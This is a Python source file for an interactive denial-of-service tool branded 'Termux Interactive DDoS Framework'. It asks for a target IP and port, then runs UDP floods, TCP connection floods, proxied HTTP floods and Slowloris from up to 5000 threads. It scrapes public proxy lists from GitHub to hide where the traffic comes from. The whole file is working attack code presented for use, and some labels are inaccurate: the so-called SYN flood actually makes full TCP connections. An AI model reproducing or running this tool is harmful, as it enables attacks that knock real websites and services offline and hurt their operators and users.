
import socket
import threading
import random
import time
import os
import sys
import requests
import re
from datetime import datetime

# ================== GLOBAL CONFIG ==================
TARGET = ""
PORT = 0
THREADS = 5000
PROXY_LIST = []
USE_PROXY = True
ATTACK_RUNNING = True
PACKET_SIZE = 65507
COUNTER = 0
LOCK = threading.Lock()

# ================== COLORS ==================
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
W = '\033[97m'; RESET = '\033[0m'; BOLD = '\033[1m'

# ================== BANNER ==================
BANNER = f"""{R}{BOLD}
╔══════════════════════════════════════════════════════════╗
║   ██████╗ ██████╗  ██████╗ ███████╗██████╗ ██████╗        ║
║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██╔══██╗       ║
║   ██║  ██║██║  ██║██║   ██║███████╗██████╔╝██████╔╝       ║
║   ██║  ██║██║  ██║██║   ██║╚════██║██╔═══╝ ██╔══██╗       ║
║   ██████╔╝██████╔╝╚██████╔╝███████║██║     ██║  ██║       ║
║   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝       ║
║                                                          ║
║      {W}v5.0 {R}- {C}Termux Interactive DDoS Framework{R}            ║
║      {Y}Auto-Proxy | Multi-Thread | UDP+TCP+HTTP{R}              ║
╚══════════════════════════════════════════════════════════╝
{RESET}"""

# ================== PROXY SCRAPER ==================
def scrape_proxies():
    """Scrape free proxies from multiple sources"""
    global PROXY_LIST
    print(f"\n{C}[*] Scraping free proxies...{RESET}")
    
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    
    count = 0
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            proxies = r.text.strip().split('\n')
            for p in proxies:
                p = p.strip()
                if p and ':' in p and len(p) < 25:
                    PROXY_LIST.append(p)
                    count += 1
            print(f"{G}[+] {url.split('/')[4][:30]}... → {len(proxies)} proxies{RESET}")
        except Exception as e:
            print(f"{R}[-] Failed: {url[:50]}{RESET}")
    
    # Remove duplicates
    PROXY_LIST = list(set(PROXY_LIST))
    print(f"\n{G}[✓] Total unique proxies loaded: {len(PROXY_LIST)}{RESET}")
    
    # Save to file
    with open("proxies.txt", "w") as f:
        f.write("\n".join(PROXY_LIST))
    print(f"{G}[✓] Saved to proxies.txt{RESET}\n")

def get_random_proxy():
    """Return random proxy from list"""
    if not PROXY_LIST:
        return None
    return random.choice(PROXY_LIST)

# ================== ATTACK METHODS ==================
def udp_flood():
    """Raw UDP flood with optional proxy (UDP doesn't support proxy - direct)"""
    global COUNTER
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
    payload = random._urandom(PACKET_SIZE)
    
    while ATTACK_RUNNING:
        try:
            sock.sendto(payload, (TARGET, PORT))
            with LOCK:
                COUNTER += 1
        except:
            pass

def tcp_flood():
    """TCP SYN flood with proxy rotation"""
    global COUNTER
    while ATTACK_RUNNING:
        try:
            proxy = get_random_proxy() if USE_PROXY else None
            if proxy:
                # Parse proxy
                parts = proxy.split(':')
                if len(parts) == 2:
                    px_host, px_port = parts[0], int(parts[1])
                    # Connect through proxy
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((px_host, px_port))
                    # SOCKS5 handshake would go here (simplified)
                    s.close()
            
            # Direct TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
            s.close()
            with LOCK:
                COUNTER += 1
        except:
            pass

def http_flood():
    """HTTP flood with proxy rotation"""
    global COUNTER
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0)",
    ]
    
    while ATTACK_RUNNING:
        try:
            proxy = get_random_proxy() if USE_PROXY else None
            proxies = None
            if proxy:
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
            }
            
            url = f"http://{TARGET}:{PORT}/?{random.randint(0,999999)}"
            r = requests.get(url, headers=headers, proxies=proxies, timeout=3)
            with LOCK:
                COUNTER += 1
        except:
            pass

def slowloris():
    """Slowloris - keep connections open"""
    global COUNTER
    while ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET, PORT))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {TARGET}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            while ATTACK_RUNNING:
                s.send(f"X-Header-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(8)
                with LOCK:
                    COUNTER += 1
        except:
            pass

# ================== STATS DISPLAY ==================
def stats_monitor():
    """Show live attack stats"""
    global COUNTER
    last = 0
    while ATTACK_RUNNING:
        time.sleep(1)
        with LOCK:
            current = COUNTER
        pps = current - last
        last = current
        sys.stdout.write(
            f"\r{Y}[⚡] Packets Sent: {W}{current:,} {Y}| "
            f"PPS: {G}{pps:,}/s {Y}| "
            f"Target: {W}{TARGET}:{PORT} {Y}| "
            f"Threads: {W}{THREADS}{RESET}    "
        )
        sys.stdout.flush()

# ================== MAIN ==================
def main():
    global TARGET, PORT, THREADS, USE_PROXY, ATTACK_RUNNING, PROXY_LIST
    
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    
    # Step 1: Ask for target IP
    print(f"{C}{BOLD}[STEP 1]{RESET} {W}Enter Target IP or Domain{RESET}")
    TARGET = input(f"{G}┌──[IP]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
    if not TARGET:
        print(f"{R}[!] No target. Exiting.{RESET}"); sys.exit()
    
    # Step 2: Ask for port
    print(f"\n{C}{BOLD}[STEP 2]{RESET} {W}Enter Port (default 443){RESET}")
    port_input = input(f"{G}┌──[PORT]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
    PORT = int(port_input) if port_input else 443
    
    # Step 3: Ask thread count
    print(f"\n{C}{BOLD}[STEP 3]{RESET} {W}Enter Threads (default 5000){RESET}")
    th_input = input(f"{G}┌──[THREADS]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
    THREADS = int(th_input) if th_input else 5000
    
    # Step 4: Proxy?
    print(f"\n{C}{BOLD}[STEP 4]{RESET} {W}Use Proxies? (y/n, default y){RESET}")
    px_input = input(f"{G}┌──[PROXY]─[{W}root@ddospro{G}]\n└──╼ {W}").strip().lower()
    USE_PROXY = px_input != 'n'
    
    # Step 5: Attack method
    print(f"\n{C}{BOLD}[STEP 5]{RESET} {W}Select Attack Method:{RESET}")
    print(f"  {Y}[1]{W} UDP Flood (Best for bandwidth)")
    print(f"  {Y}[2]{W} TCP Flood")
    print(f"  {Y}[3]{W} HTTP Flood (Best for websites)")
    print(f"  {Y}[4]{W} Slowloris (Best for Apache/Nginx)")
    print(f"  {Y}[5]{W} ALL METHODS (Maximum Chaos)")
    method = input(f"{G}┌──[METHOD]─[{W}root@ddospro{G}]\n└──╼ {W}").strip() or "5"
    
    # Scrape proxies if enabled
    if USE_PROXY:
        scrape_proxies()
    
    # Launch attack
    print(f"\n{R}{BOLD}[🔥] LAUNCHING ATTACK...{RESET}")
    print(f"{W}Target: {R}{TARGET}:{PORT}{RESET}")
    print(f"{W}Threads: {R}{THREADS}{RESET}")
    print(f"{W}Method: {R}{method}{RESET}")
    print(f"{W}Proxies: {R}{len(PROXY_LIST) if USE_PROXY else 'Disabled'}{RESET}")
    print(f"\n{Y}Press Ctrl+C to stop\n{RESET}")
    
    time.sleep(2)
    
    # Start stats monitor
    threading.Thread(target=stats_monitor, daemon=True).start()
    
    # Launch threads based on method
    methods = []
    if method == "1": methods = [udp_flood]
    elif method == "2": methods = [tcp_flood]
    elif method == "3": methods = [http_flood]
    elif method == "4": methods = [slowloris]
    else: methods = [udp_flood, tcp_flood, http_flood, slowloris]
    
    threads_per_method = THREADS // len(methods)
    
    for m in methods:
        for _ in range(threads_per_method):
            t = threading.Thread(target=m, daemon=True)
            t.start()
        print(f"{G}[+] Launched {threads_per_method} threads for {m.__name__}{RESET}")
    
    # Keep alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ATTACK_RUNNING = False
        print(f"\n\n{R}[!] Attack stopped by user.{RESET}")
        print(f"{Y}[📊] Total packets sent: {COUNTER:,}{RESET}")
        sys.exit()

if __name__ == "__main__":
    # Install dependencies check
    try:
        import requests
    except:
        print(f"{R}[!] Installing requests...{RESET}")
        os.system("pip install requests")
    
    main()
PYEOF